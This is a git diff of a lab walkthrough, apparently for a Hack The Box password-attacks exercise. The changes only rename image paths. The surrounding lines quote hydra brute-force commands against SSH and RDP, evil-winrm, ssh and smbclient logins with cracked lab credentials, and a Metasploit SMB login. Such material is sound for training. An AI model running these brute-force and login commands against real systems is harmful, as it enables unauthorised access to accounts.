@@ -67,13 +67,13 @@ Find the user for the **WinRM** service and crack their password. Then, when you
 
 `evil-winrm -u john -i 10.129.218.11 -p november`
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
 `hydra -L username.list -P password.list ssh://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ssh dennis@10.129.238.248`
 
@@ -85,11 +85,11 @@ Find the user for the **RDP** service and crack their password. Then, when you l
 
 `hydra -L username.list -P password.list rdp://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Reminna to login
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SMB** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
@@ -109,9 +109,9 @@ Find the user for the **SMB** service and crack their password. Then, when you l
 
 `run`
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient -U cassie -L \10.129.238.248`
 
@@ -778,7 +778,7 @@ mike:7777777
 
 `ftp 10.129.189.211`
 
-<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
@@ -804,7 +804,7 @@ passphrase: same as password
 
 `nmap -sVC 10.129.202.221`
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 * SSH, SMB
 
@@ -824,11 +824,11 @@ METASPLOIT
 
 `run`
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient \\\\10.129.202.221\\SHAREDRIVE -U john`
 
-&#x20;![](<.gitbook/assets/image (2) (1).png>)
+&#x20;![](<.gitbook/assets/image (2) (1) (1).png>)
 
 `smbclient \\10.129.202.221\SHAREDRIVE -U john%123456 -c 'get Docs.zip'`
 
